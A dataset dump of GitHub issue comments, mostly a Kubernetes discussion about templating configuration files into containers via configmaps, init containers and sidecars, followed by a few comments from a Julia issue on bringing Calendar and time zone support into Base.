kubernetes/kubernetes/30716/240544956,"As a note - my point here is not to dismiss ConfigTemplate out of hand, it is merely to ensure that the mechanisms that we have that should be able to solve this actually solve this in a clear and demonstrable way.  If they don't, they absolutely must be fixed. ",,False,False,30716
kubernetes/kubernetes/30716/240572345,"@friend can you give an example of an init container implementation, using current Kubernetes?  Because my experience is that they're more complicated than you describe.  But maybe I'm doing them badly. ",,False,False,30716
kubernetes/kubernetes/30716/240623227,"A few thoughts. First, a new object on its own does nothing for you.  You still need a new volume driver to project it into the FS.  given that, I don't think you actually need an API object at all.  What you have described looks like a volume. Second, there are tricks that can pull files from multiple volumes (secret, configmap, downwardapi) and project into a single directory, with the caveat that auto-updates don't work (bind mount semantics bite us).  If this is really a stumbling block, we can consider a way to project from multiple sources into a single volume.  @friend and I already sketched it out. Third, there are ways to inject a new entrypoint.sh into a container.  You can make a configmap with a key named  and the value being a shell script.  Mount that on /entry, and make your container's  be /entry/entrypoint.sh.  You don't need to customize upstream images for this.  If this is not satisfying, I would consider a ""literal"" volume driver that just copied a string into a file. Fourth, I didn't grok why a sidecar doesn't work?  Declare an emptydir called /config.  Mount it on both the sidecar and and the main app container.  The sidecar also mounts N configmaps and secrets and downward API.  The sidecar periodically evaluates a template (maybe a configmap or a flag) and fills in variables from the other configmaps and secrets.  It writes the results to /config/.config.tmp, compares /config/config.file with that tempfile and renames the tmp to the real name if needed.  The app container just watches inotify for changes to the /config/config.file. Lastly, nothing stops you from using third-party resource and flex volume to implement this yourself and prove us wrong.  If it turns out to be overwhelmingly popular we can either adopt it as standard or just endorse your cleverness ) On Wed, Aug 17, 2016 at 346 PM, Josh Berkus notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/240771207,"@friend I'm not looking to make this possible, I'm looking to make it simple.  It's possible now, but a large number of our users can't figure out how to do it.  And this is a spec issue, so the purpose of this is ""let's determine the spec for this"". Projecting configuration files into running containers is something our users need to do for something like 3/4 of running containers.  Right now the standard approach for that is hackish entrypoint.sh scripts, which is a terrible state of the art, and causes a lot of folks to legitimately question whether they made a mistake moving away from CMS and towards orchestration. Something which 80% of our users need to do 75% of the time shouldn't be complicated or require advanced Kubernetes knowledge. It should be simple, obvious, and there should be a recommended mainstream way to do it.  Whether that's templates or config volumes or sidecars, I don't really care, provided that it's something which a new Kubernetes user can learn in 20 minutes. ",,False,False,30716
kubernetes/kubernetes/30716/240775844,"No disagreement, but we should first explore refinements on existing behaviors before piling on new abstractions and API kinds. On Thu, Aug 18, 2016 at 903 AM, Josh Berkus notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/240776467,"I'm OK with that.  Would you be willing to sketch out a doc on how you'd do it, now?  Because you seem to find existing approaches easier than I do. ",,False,False,30716
kubernetes/kubernetes/30716/240784847,"I have zero bandwidth for the next few weeks.  We need community folks like yourself to come up to speed on alternatives and help make educated designs.  As much as I like having an opinion on everything, there aren't enough hours in the day.  The way this community grows and thrives is when new people step into the light and own problems ) I appreciate your vociferous advocacy of the user in this issue, so far... On Thu, Aug 18, 2016 at 920 AM, Josh Berkus notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/240791255,I have created a simple PoC for configmap templating here  solution however uses downwardAPI volumes and the configfiles are simple another possible item type that can be used there. Your idea with bare files that can be placed anywhere seems to be superior. I don't know however how it would be with implementation. Also what would be the possibilities to implement some improved change propagation. ,,False,False,30716
kubernetes/kubernetes/30716/240846531,"@friend I hear you.  Well, anything I do on this will need to come after CNCF day ... ",,False,False,30716
kubernetes/kubernetes/30716/240963841,"Definitely plus one to @friend words. This is very important topic (that's why @friend and @friend made PoCs), it definitely should be easy and understandable to end user. I'm pretty sure that assumption that you can store configs in  is valid only in perfect world, but in reality it's not that easy. In my opinion any solution which uses init-containers, custom init scripts, init-containers to do templating feels hacky and requires serious k8s knowledge or pollutes pod/container definition with logic that shouldn't be there. ",,False,False,30716
kubernetes/kubernetes/30716/240994417,"About initscripts besides ""feeling hacky"" the problem is they lack DRY-ness. You need to specify the data twice. First in the pod definition. Second - in the script. So your deployments become harder to maintain. My proposal Let's add an ability to add config file templates. These templates will be able to consume data from the following sources  Configmaps Secrets Pods  The templates will use syntax based on  package (I believe it is powerful enough for our needs). The template can be  Specified as inline data in the definition file In an external file referred by filename relative to the location of definition file.  The files can be inserted to the pod in two ways  Mounted separately in any place (at least Docker supports single file mounts) Added to DownwardAPI volumes  The ""DownwardAPI"" volume could be renamed if it is confusing to newcomers. Generally however the original DownwardAPI and ConfigMap volumes should become deprecated as much less powerful than templating. What we need The current state of PoC implements a lot for this proposal. What is still missing is  Single file mounts Templates in separate files Secret data consumption Consuming several configmaps directly (you can use configmap links however)  Questions  Are there any objects beside Pods, Secrets and ConfigMaps we want to be source of data? Do we need any tools in our templates beside simple interpolation of values and text/template tools?  I would like to call @friend and @friend to pay attention to this thread as well. The next two weeks I will login irregularly, but please comment. ",,False,False,30716
kubernetes/kubernetes/30716/241006118,"Oh, also @friend - please comment if these requirements are enough for us. ",,False,False,30716
kubernetes/kubernetes/30716/241016463,"@friend Looks good, there is one of the examples we will be happy to see covered with templates. ",,False,False,30716
kubernetes/kubernetes/30716/241051092,"@friend plus one BTW, one of the examples I'm dealing with is PostgreSQL, where the config files need to go into a specific directory, which also contains files we want to inherit from the upstream image.  Postgres also has specific permissions requirements for those files.  So I think that's a good test case for any scheme; if it can handle Postgres, it can probably cover any service. ",,False,False,30716
kubernetes/kubernetes/30716/241052625,"Some answers  Are there any objects beside Pods, Secrets and ConfigMaps we want to be source of data?  If by ""pods"" you mean ""everything currently available via the core Downward API"" then those three things cover all of the use cases I have.  Do we need any tools in our templates beside simple interpolation of values and text/template tools?  I do not for my use cases. ",,False,False,30716
kubernetes/kubernetes/30716/241213777,"So I have some thoughts here based on the ""datacenter as a computer"" and ""k8s as a cloud OS"" abstractions. I think the fundamental primitive that we're lacking is higher-level environment variables. So what I think would be most powerful here is the abstract concept of an  that provides variables that can be interpolated for probably any sort of resource. This would be exactly analagous to the way  and the way environment variables are usable/overridable at the separate levels of a standalone OS. So, what I would propose as an alternative would be an `Environment ♠yaml ",,False,False,30716
kubernetes/kubernetes/30716/241221649,@friend I'm not seeing how this lets me drop a Pod IP into a config file in the container? ,,False,False,30716
kubernetes/kubernetes/30716/241224326,"Ah, sorry, I missed the example of dropping in the pod IP. I've never really had that particular issue, since the pod IP is already known to the process (that is,  or  will return the pod IP). Still, I think there's a growing problem in k8s of ""kind"" sprawl, so if we're proposing a templating solution, I'd rather see something generically applicable for any existing object, however it makes sense for those objects (much like a bash environment abstraction). That said, if you wanted to add dynamic data (e.g. downward API), the  list has always allowed  that supports dynamic data. The problem with my suggested approach if that was allowed, though, is that you now have the potential for cycles if  is used. This is a problem with the previously-proposed solution as well; that or deadlocks if two Templates refer to one anothers' products, so either way some thought ought to be put into that case, in which case I think it's likely applicable for both solutions. ",,False,False,30716
kubernetes/kubernetes/30716/241233801,"On further thought, a  construct could be shorthand for a command that gets run in an init container which is basically just the kube* tools (most importantly kubectl) set up for in-cluster commands. This would be quite powerful and fit with the general that one can also run any OS command inside $() in a shell. ",,False,False,30716
kubernetes/kubernetes/30716/241593299,@friend huh.  where is that documented? ,,False,False,30716
kubernetes/kubernetes/30716/241599050,"@friend I thought we had doc on this, but I couldn't find any after a brief search (we'll fix that); design doc is ",,False,False,30716
kubernetes/kubernetes/30716/241600628,"I swear this is documented.  Please tell me it is documented... On Mon, Aug 22, 2016 at 616 PM, Paul Morie notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/241609773,@friend This is pretty much what my internal monologue is saying right now... ,,False,False,30716
kubernetes/kubernetes/30716/241610308,I see it referenced in a couple places  API Reference ConfigMap docs  ...but it looks like there is no good user-facing doc for this.  I'll write some ASAP. ,,False,False,30716
kubernetes/kubernetes/30716/241610448,I swear I remember writing doc for this... ,,False,False,30716
kubernetes/kubernetes/30716/242968136,"Regarding improvements for environment variables I believe this is out of scope for this proposal. This one is specifically to allow DRY and simple generation of configuration files. Especially for some legacy apps, that would otherwise need startup scripts. Regarding the choice of templating language The text/templates module has more than enough power for our purpose. It is easily extensible besides. It also is a builtin and is quite intuitive, so we lower the entry level for new programmers of this feature. If someone believes we could need some more power, we could expose some entry point to allow plugging template filters (I don't think that would ever be necessary, but it can be implemented) ",,False,False,30716
kubernetes/kubernetes/30716/242994555,"Given the previous discussions in the template proposal, we are unlikely to use Go templates as a first class mechanism.  I highly recommend reading that proposal and the associated issue for context - that will impact how any proposal in this space would be constrained. ",,False,False,30716
kubernetes/kubernetes/30716/243244723,... choice of templating syntax still seems like the least important thing about this discussion.  Especially since we might not do templates at all. ,,False,False,30716
kubernetes/kubernetes/30716/243828024,@friend Env. substitution does not have a user-facing doc AFAIK. See #15244 re. how disorganized our pod/container docs are. Please reach out to sig-docs for advice about where to put this content. ,,False,False,30716
kubernetes/kubernetes/30716/243829166,See also #11492 ,,False,False,30716
kubernetes/kubernetes/30716/243830237,Ref #2068 ,,False,False,30716
kubernetes/kubernetes/30716/243830491,@friend Links to examples of entrypoint.sh scripts? ,,False,False,30716
kubernetes/kubernetes/30716/243890520,Note that we've also talked about creating a library of sidecars ,,False,False,30716
kubernetes/kubernetes/30716/243891394,"We don't allow env vars to be changed today, but I could imagine supporting that in the future, and we do allow ConfigMap changes, so I think initContainers won't work and though I'm a fan of container volumes (#831), I think that shares the same problem. Image volumes (also #831) would allow config files to be packaged separately, however, as mentioned above. ",,False,False,30716
kubernetes/kubernetes/30716/243891457,cc @friend ,,False,False,30716
kubernetes/kubernetes/30716/243892117,"Maybe @friend has suggestions, also. ",,False,False,30716
kubernetes/kubernetes/30716/243892754,"I must be losing my touch. I was sure that @friend previously proposed an inline volume source, but I can't find it. That said, I like @friend's command-line alternative. ",,False,False,30716
kubernetes/kubernetes/30716/243916237,The template proposal was #18215 and the doc is here  implementation issue is #23896 ,,False,False,30716
kubernetes/kubernetes/30716/243932899,"@friend so that's a different kind of template, one for the service definition itself, rather than a template for files to be pushed into the running containers. ",,False,False,30716
kubernetes/kubernetes/30716/243935509,"@friend Some examples  Patroni Postgres    Note how pretty much all that entrypoint script does is create a config file out of ENV variables.  And yet, it's vulnerable to quoting issues, disrupts signal processing, etc.  Official Postgres Image for Docker  one does several things, but I'd like to call out this horrible line  Redmine, official image  (worst case, really)  we can't get Docker to change the official images because they won't have configfile support.  But we could make it not necessary for our users to go to such lengths. ",,False,False,30716
kubernetes/kubernetes/30716/243951799,"@friend i question how many people want config map changes inline (in practice) vs deployment controlled.  config map changes inline are ""hooray, now your application is broken all at once"" so I think they are reserved for sophisticated users. On Wed, Aug 31, 2016 at 743 PM, Josh Berkus notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/243957682,@friend I agree about inline configmaps. I was just looking for past discussions about related topics. ,,False,False,30716
kubernetes/kubernetes/30716/244079393,"Working through the comments in this thread I would strongly suggest we not build a configuration management tool into Kubernetes. Once we go this route there will be no turning back, we will reach a point of owning a subset of functionally that every configuration management tool does. Today the request is for dynamic configuration with the ability to pull data from any source. Tomorrow it will be nested configuration, permissions, merging, and pushing data back into Kubernetes to be consumed by other pods and containers. Dynamic configuration can be accomplished with init-containers and sidecars, what we lack is great documentation and working examples of how to do it using existing tools such as confd, consul-template, or ansible. Is there any chance the community can spend some time working with what we have and writing up the results after several rounds of experimenting? The reason all of this seems hacky is because it is. The fact that some people want to extract configuration and templates from container images and merge them with user defined configuration and templates will be the source of pain to come. One idea I've experimented with is running something like consul-template or confd in a controller that would render templates based on external data (secrets, configmaps, consul, etc) into other secrets and/or configmaps that are consumed by pods. This would get us 90% there in terms of dynamic configuration. The last mile stuff is a little harder. Once your app needs pod level information, then the user is forced to run the configuration tool as an init-container or sidecar. The main challenge is combining configuration and templates that ship inside of a container image with the user defined configuration and templates stored in Kubernetes. I think we should ask the community to strongly consider avoiding this problem entirely. Since my days at Puppet Labs, its always been considered a good idea to separate application code and configuration. In the case of Kubernetes that would mean storing all configuration files and templates outside of container images and ensuring that each configuration file is referenced from a Kubernetes configmap or secret, which may have been generated from an external configuration controller running in the cluster. This keeps Kubernetes easy to reason about. For the last mile stuff like ""I need my Pod IP"", then users will need to rerun a templating tool from an init container and refresh the config from a sidecar. We have the same problem for all dynamic content including short lived secrets such as the ones you get from HashiCorps vault project. The problem here is that a very small subset of applications really want Pod level details, which feels like a real one off to me. I rather not build a general solution for what feels like a one off. ",,False,False,30716
kubernetes/kubernetes/30716/244122360,"@friend ""The problem here is that a very small subset of applications really want Pod level details, which feels like a real one off to me."" Given that I started down this particular quest based on something you said, this seems like a contradictory attitude.  Do you want people to get rid of ""init scripts for hipsters"", or not?  If you really do, the answer is to make doing things the right way easier, rather than much harder. ",,False,False,30716
kubernetes/kubernetes/30716/244130184,"BTW, I'm not saying that a template object is the answer.  I'm just saying that we need an answer which isn't ""implement this long complicated toolchain involving several different kinds of objects"". ",,False,False,30716
kubernetes/kubernetes/30716/244185782,"Inline volumes discussed in  Thu, Sep 1, 2016 at 913 AM, Josh Berkus notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/244471244,"@friend Those examples are helpful, thanks. ",,False,False,30716
kubernetes/kubernetes/30716/244951884,"@friend  If the idea of using any templating language above simple substitution is rejected, will it be acceptable to allow for plugins (containerised?) that would receive the template and JSON data and perform the template rendering? ",,False,False,30716
kubernetes/kubernetes/30716/244958194,"Yes, although that's effectively what an init container is (a plugin to pod initialization).  If the usability of doing that is hard, we can improve it. On Tue, Sep 6, 2016 at 936 AM, Szymon Pyżalski notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/245837476,Rendered configuration files proposal (v 2.0) Configuration file object The configuration file object specifies one configuration file that can be mounted in a container. They will be specified per pod. Either inlined in pod definition or defined separately and linked in a pod. Example configuration file definition Data sources Data sources are objects that contain data that can be used in this config file. The data sources can be  configmaps secrets environment variables  also a pod is a data source that exposes several values like  PodIP Labels Name  Every data source has a name. The pod is automatically added with reserved name . The environment variables as mapping under reserved name Config Config can be any mapping. The specification for config depends on the renderer. Renderer A renderer is a container that is creating the actual content for the file. Thanks to the renderer all the templating (or other) logic is moved from the k8s core that can be unopinionated on how the rendering should take place. The renderer when called is passed  The config (as it is) The data from all the sources as a mapping {sourceName data}  The renderer should produce the config file content and exit. Summary The above proposal allows for  Declarative and DRY creation of configuration files Easy reuse of data in configmaps Simple and reusable implementation of templating that is however separated from the core Usage of basic pod facts and interpolating them in configuration files Future implementation of data propagation  ,,False,False,30716
kubernetes/kubernetes/30716/245955343,"On Wed, Aug 31, 2016 at 636 PM, Clayton Coleman notifications@friend.com wrote I use it as a small-file push mechanism ",,False,False,30716
kubernetes/kubernetes/30716/245958399,"How is this better than adding a template-renderer container that reads the template from a flag or file and renders into a volume? On Fri, Sep 9, 2016 at 1213 AM, Szymon Pyżalski notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/246266124,@friend it seems to be simpler and more generic. Everything is in the config file. The mount logic is in core. So we don't need any hacky init container logic. ,,False,False,30716
kubernetes/kubernetes/30716/246433600,"That is not a very compelling reason.  The cost of things in core is 10x the cost of things out of core. On Mon, Sep 12, 2016 at 1212 AM, Szymon Pyżalski notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/246448946,"Tim, you are the very definition of sophisticated user here )​ ",,False,False,30716
kubernetes/kubernetes/30716/246449968,"I think there is probably some missing semantic sugar around pods of this form.  One might be directly inlining small files via a volume type, which avoids entrypoint hackiness.  We'd have to strongly control size though. I look at the vitess examples and think that is a reasonable ""higher end"" configuration size for a pod ( one where an inline file would improve the organization of the code. ",,False,False,30716
kubernetes/kubernetes/30716/246454393,"I was all into inline volumes, but ConfigMap is more powerful and already exists. On Mon, Sep 12, 2016 at 1146 AM, Clayton Coleman notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/246465704,"Wow, @friend, thanks for the vitess example. I think this section is an excellent example of one of the emerging patterns that makes practical use of kubernetes harder (and less portable) than it needs to be. To boil down my opinions concisely, I think there are two patterns emerging that are used solely for the case of handling (respectively) cluster-level variables and runtime variables  Explicitly pre-processing of manifests via shell script Explicitly post-processing of Kube objects via init containers/scripts  I think these two use cases are pervasive enough that they warrant some syntactic sugar and integration into the tool/environment to eliminate both types of wrapper scripts (wrapping kubectl and wrapping your containerized process). To address @friend's concerns about ending up writing a CMDB, I think that kube crossed that bridge long ago when ConfigMaps and Secrets were added and allowed those to be mapped to environment variables or files. We're storing our config in our cluster/namespaces already, but restricted to confusing (while powerful) ways of consuming that data (wrappers/init containers). So, that said, can we at least agree that for the sake of user experience, it would be beneficial to have an integrated, easy-to-understand and easy-to-use, way of getting their cluster config and metadata into their kube objects? Not that it can't be solved dozens of other ways, which is clearly true, but that in terms of usability for all sorts of users, can't we do better? ",,False,False,30716
kubernetes/kubernetes/30716/246466337,"ConfigMap is not update safe (without extra care today) and can't be delivered easily as an atomic unit.  I agree there are downsides to inline volumes, but I do think small ones would be a net usability win. ",,False,False,30716
kubernetes/kubernetes/30716/246466540,"The section you pasted is really just a PetSet - when this example was written it wasn't possible, but it's really the same concept (and was taken into account during the petset core design). ",,False,False,30716
kubernetes/kubernetes/30716/246510836,"On Mon, Sep 12, 2016 at 1240 PM, Clayton Coleman notifications@friend.com wrote I don't understand this.  It's not atomic wrt all pods getting updates at the same time, but it's not as if they see a half-cooked state of the CM.  The only upside I see to an inline volume is the inline-ness of it. ",,False,False,30716
kubernetes/kubernetes/30716/246524826,"You create config.  App gets deployed.  You're happy.  Someone updates the config.  A node is evacuated elsewhere in the cluster and one of your pods picks up the new config.  Everything fails.  You try to figure out what the old values of config are.  You cry. The sharp edges of that ""surprise, your app doesn't work"" are what I'm most concerned with.  We tell everyone to use configmaps, and a non-trivial percentage of people don't reason about the interaction of config map with an administrator evacuating a node, and a non-trivial percentage of applications will fail and fail hard with mismatched config.  So trying to find places where the path of least surprise is exactly how you expect the platform to work, even if you don't think about it, and then you can go use it in sophisticated and awesome ways later.  If configmaps defaulted to readonly after creation, and you had to go think about allowing them to mutate, that would be one example of safety.  Or if the configmap automatically preserved old versions of itself that you could roll back to. The advantage of inline configmap is that it cannot be out of sync with the cluster and can be propagated through a deployment in a trivially correct way. On Mon, Sep 12, 2016 at 608 PM, Tim Hockin notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/246527030,Can we split off the discussion of live updating configmaps after deployment into a separate proposal?  It's really a completely different feature. ,,False,False,30716
kubernetes/kubernetes/30716/246528914,"It's relevant with respect to inline configmaps templating and making it easier to do config templating inline with the minimal syntax.  An inline config map avoids bash squirreliness and makes a wider range of init container templating engine options feasible.  So I don't think it's separate. On Mon, Sep 12, 2016 at 725 PM, Josh Berkus notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/246529125,"Don't think it's totally separate.  We already have an issue for the live updating. On Mon, Sep 12, 2016 at 736 PM, Clayton Coleman ccoleman@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/246536577,"It does seem to be at least tangentially related, though I think the topic of ""what happens if the config map changes"" is still orthogonal to ""can templated config maps change if upstream data sources change?"" The latter seems very relevant. IMO the inline config map vs external config map would also be irrelevant given a good templating solution. If the templating solution is complete, then either option should reasonably accept template placeholders. Also to address another of @friend 's concerns I think we'd all agree with that (if I'm understanding you correctly). And I think the intent is still that in any case, given k8s objects with template expressions, the final product is k8s objects ready for consumption, e.g. mounting into the volume as a config file, resulting in a container image that does not need to be tailored beforehand to k8s. ",,False,False,30716
kubernetes/kubernetes/30716/246551184,"I think it's important to note that we already have solutions in the ecosystem for complex multi resource templating that we have previously said belong above the core platform - specifically Deployment Manager (now the server component of Helm), local templating + apply, Ansible, and others.  To Kelsey's point, we are trying not to build one of those solutions in the core, because they belong as a properly layered component on top.  Half of the discussion is how to build those (which others are doing) and half has to be on how we make those tools able to do less by having good primitives. I don't think any template language we include will make those tools easier to use, because they will now have multiple languages to apply.  The argument I usually hear is trying to make Kube fit better into Ansible, existing config mgmt flows, HEAT, Deployment Manager, etc.  Mixing template languages is really painful, so it doesn't seem like a clear win if we're meeting the community where they are. For instance, we don't want to put a template language under apply - we want it to be above (an input to apply), so that people can lean on apply to avoid having to do local patch merging. As another example, iterative config application (inputs to template change -&gt; template generates new output -&gt; deployment triggered) requires at least minimal outside orchestration, especially when multiple components are involved.  We aren't eager to make that orchestration a first class concept in kube because it's likely no one orchestrator is a suitable solution for all use cases. A template evaluation environment that is even partially or strongly turing complete has to run in a pod, just by its nature.  Deployment Manager does this with expandybird - as something like what is proposed here grows more flexible it would also have to be run in a pod.  Given that the output of that pod is a transformed local file, it's really hard to justify a completely separate implementation that isn't an init container (at least right now) because the init container is already isolated and under the user's control and doesn't have to implement a separate API / transport channel. The short term things already discussed in this thread have a lot of individual merit  Better doc and examples around existing init container use here (and a really strong minimal example that tries to be as ""api like"" as possible) Inline config maps Prototyping (or working with Helm or the AppController guys) an orchestrator that can copy config map changes for deployments (and can by definition also go run templates) to show your desired flow Projection of volumes into pods more effectively (@friend spawned an issue on this) A better way to catalog / inject helpful sidecar patterns into containers (kubectl add-sidecar deployment/foo --from=mylibrary-of-sidecars)  Did I miss any? On Mon, Sep 12, 2016 at 823 PM, Andrew Stuart notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/246573528,"On Mon, Sep 12, 2016 at 413 PM, Clayton Coleman notifications@friend.com wrote I assume you mean ""without bouncing the pod, and the app does not pick it up dynamically"" Someone laid a land mine and was sad when they stepped on it.  I 100% agree land mines are bad, but this is not the first such case. ReplicationController and ReplicaSet have the same problems.  Docker image tags being mutable have the same problems. Conversely, if you had defined it as an inline volume, RC and RS would fail the same way, and Deployment would try to roll out and fail right away. If you don't want a time bomb, you HAVE to actuate changes right away, regardless of whether that's an inline or not. Is ""I updated a config map"" really more confusing than ""I updated my replication controller"" ?  In both cases, it is part of your ""app DAG"" and you updated it. Mismatched config is a fact of life, no matter what - whether that is a rolling update or an accidental land mine. This is why we generally tell people not to update configmaps, but create a new one, update your deployment, and do an rolling update. I don't buy it - you can lay almost the same traps with an inline, if you're not careful.  I'm not AGAINST an inline volume, per se, I just don't see the value that justifies the extra complexity.  I'm willing to be swayed by ""but UX"", but this, in the end, just a TINY piece of what this bug is aboyut. ",,False,False,30716
kubernetes/kubernetes/30716/250018486,"@friend, all I'm inclined at this point to close this in favor of a proposal of ""make init containers easier to use"", which seems like the way to go.  However, there have been a LOT of other proposals on this issue which aren't mine; is it OK to just close it nevertheless? ",,False,False,30716
kubernetes/kubernetes/30716/250020547,"@friend I don't think so that init container is the way to go, proposal submitted by @friend looks nice. And I think it's worth solving it a bit at configmap level. ",,False,False,30716
kubernetes/kubernetes/30716/250237095,"I wonder if resource templating as a whole would be worth discussing on the community call ( cc @friend ) (Or, is there an appropriate SIG?). For me, there are already too many in-motion proposals and implementations (the helm tool and this templating issue spring to mind) to keep track of. Even if it's just a ""yes, we are going with 23896 for the foreseeable future"" acknowledgement, it'd be helpful in my mind for some sort of consensus and communication about the project's direction on this matter. ",,False,False,30716
kubernetes/kubernetes/30716/250239499,"                                                                                  There are some plans to discuss that on sig-apps.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        From Andrew StuartSent środa, 28 września 2016 1927To kubernetes/kubernetesReply To kubernetes/kubernetesCc Jędrzej Nowak; CommentSubject Re [kubernetes/kubernetes] Proposal Template object for in-container configuration files (#30716)I wonder if resource templating as a whole would be worth discussing on the community call ( cc @friend ) (Or, is there an appropriate SIG?). For me, there are already too many in-motion proposals and implementations (the helm tool and this templating issue spring to mind) to keep track of. Even if it's just a ""yes, we are going with 23896 for the foreseeable future"" acknowledgement, it'd be helpful in my mind for some sort of consensus and communication about the project's direction on this matter.  —You are receiving this because you commented.Reply to this email directly, view it on GitHub, or mute the thread. {""api_version""""1.0"",""publisher""{""api_key""""05dde50f1d1a384dd78767c55493e4bb"",""name""""GitHub""},""entity""{""external_key""""github/kubernetes/kubernetes"",""title""""kubernetes/kubernetes"",""subtitle""""GitHub repository"",""main_image_url"""" in GitHub"",""url"""" in #30716 I wonder if resource templating as a whole would be worth discussing on the community call ( cc @friend ) (Or, is there an appropriate SIG?). For me, there are already too many in-motion proposals and implementations (the helm tool and this templating issue spring to mind) to keep track of. Even if it's just a \""yes, we are going with 23896 for the foreseeable future\"" acknowledgement, it'd be helpful in my mind for some sort of consensus and communication about the project's direction on this matter.""}],""action""{""name""""View Issue"",""url""""",,False,False,30716
kubernetes/kubernetes/30716/251065255,@friend @friend @friend @friend @friend could we organize a short discussion in sig-apps about that? ,,False,False,30716
kubernetes/kubernetes/30716/251184808,"I don't usually attend sig-apps, please let me know if/when this is on the agenda On Mon, Oct 3, 2016 at 239 AM, Jędrzej Nowak notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/251185659,"@friend Ditto @friend, and also that nobody's paying me to do k8s work (yet), so my regular work will have to take precedence, but I can definitely try to attend, depending on the time. ",,False,False,30716
kubernetes/kubernetes/30716/251188503,"Also, you may want to comment on #23896 and/or kubernetes/features#35 if there's going to be a generalized discussion as they will almost certainly have either made progress already or have opinions and suggestions of their own to add. ",,False,False,30716
kubernetes/kubernetes/30716/292595985,"@friend Is there any chance that there is more documentation beyond the examples you mentioned in  ? I desperately want to share the available syntax with colleagues, but cannot be certain how much is implemented (and in which version). ",,False,False,30716
kubernetes/kubernetes/30716/341531834,Any decision has been made on this? ,,False,False,30716
kubernetes/kubernetes/30716/341588872,No templates. ,,False,False,30716
kubernetes/kubernetes/30716/342539710,Is there a recommended way to inject a configuration file with interpolated variables/secret into a container at the moment? ,,False,False,30716
kubernetes/kubernetes/30716/342559053,"@friend Please ask on kubernetes-users and/or stackoverflow, or try to build a consensus within SIG Apps. ",,False,False,30716
kubernetes/kubernetes/30716/348259591,"So , as of now im assuming no we dont / can't encrypt data in configmaps. ",,False,False,30716
julia/JuliaLang/3524/15941511,"Is it possible to merge Calendar into Base, possibly after some bikeshedding? We had so much discussion about time series support last year, then Calendar became the de facto time series tool without ever entering Base. ",,False,False,3524
julia/JuliaLang/3524/19928322,"plus one If it's ironed out enough, I think time series support is a very natural expectation of Base material. ",,False,False,3524
julia/JuliaLang/3524/19929795,"I really wish that this didn't entail depending on ICU, but we probably should. ",,False,False,3524
julia/JuliaLang/3524/19932411,"Please ping me when this lands, as I should probably update build recipes and debian package requirements to include . ",,False,False,3524
julia/JuliaLang/3524/19939087,How much functionality can we retain without ICU? ,,False,False,3524
julia/JuliaLang/3524/19939982,"I've started digging into it a little bit, and @friend can speak to it more, but currently  is very dependent on ICU. Excluding ICU would basically require rewriting everything, but I'm also inclined to think we could get the majority of the functionality in a very Julian way without ICU and also without it being too difficult to implement (ICU has pretty good documentation of everything). Would definitely be a fun project if we decided to go that way. ",,False,False,3524
julia/JuliaLang/3524/19946754,"@friend It depends on what you mean by ""majority of the functionality"". Implementing zulu time in pure julia would be easy. Adding timezone support, however, would be quite difficult. As i see it, proper timezone handling is Calendar's raison d'etre. ",,False,False,3524
julia/JuliaLang/3524/19957493,"@friend agree with @friend. Zulu time is implemented in pure Julia in  (the api is different from Calendar, but that would be a trivial change) Adding timezone support is the missing piece. I had some julia code to parse the olson database, but never got to implementing the conversions. On top of that, one needs leap second support. Another large piece of functionality that ICU provides is date formatting/parsing. All of which is certainly doable, but is a large chunk of work. ",,False,False,3524
julia/JuliaLang/3524/19958431,"ICU is big, but it is easy to get on Linux and is included in OS X. I believe it also works on Windows. Even if we can reimplement much of what we need in Windows, it will be quite a chore to support. I am in favour of using ICU and bringing Calendar into Base. Over time, we could reduce our dependence on ICU, if circumstances demand. ",,False,False,3524
julia/JuliaLang/3524/19966321,"My vote would be to start out with a simpler featureset in pure Julia (a la SimpleDate.jl) with a clean API that can be expanded over time and exclude the ICU dependence. Starting out with a more SQL-like support with Date, Time, DateTime types, lubridate-style arithmetic, duration, period, and interval support, and IO support with parsing/formatting is a solid foundation that provides a lot of basic functionality. As for leap seconds, we could take ICU's approach and ignore them ) (basically leave it to the operating system to figure out). Timezone support is definitely a bigger chunk of work to do manually, but there are simple ways to include basic functionality (as @friend mentioned) and marking it as a future feature for full support I think is reasonable. ",,False,False,3524
julia/JuliaLang/3524/19974242,@friend  happy to give you commit access to SimpleDate if you want to run with that codebase. ,,False,False,3524
julia/JuliaLang/3524/19975028,"In general, I like @friend's gung ho attitude. My major worry is that we can't start using times without leap seconds and then introduce them later unless we tell people that the date time support is a draft at best. ",,False,False,3524
julia/JuliaLang/3524/20010466,"Thanks @friend, I've enjoyed going over your code today and I'm taking a stab at adding features while trying to follow Calendar.jl's conceptual framework to get a working julia Calendar/Timezone implementation. The thing with leapseconds is there really isn't a lot of consensus on how to handle them at all. Most languages/applications (including ICU) have taken the approach that they're not going to worry about it and let it be an OS problem. Implementation can be tricky, but we can take a stab at it if we deem it important enough. I found blog post here with a good walkthrough of considerations, and also came across a slightly hacky way that Google deals with leapseconds. The problem with a lot of ""solutions"" (hacks mainly) is that they're all pretty much clever ways to trick servers into dealing with an extra second every once in a while and not really a formal API or anything. One thing I thought of was doing a simple cache of year seconds/milliseconds and basing our date parsing off of them. That would allow us to easily manually add seconds as needed, calculate accurate durations/intervals, and also has the added benefit of giving us much faster date parsing. Anyway, I'll plug away a little more and see if I can't push something for review. ",,False,False,3524
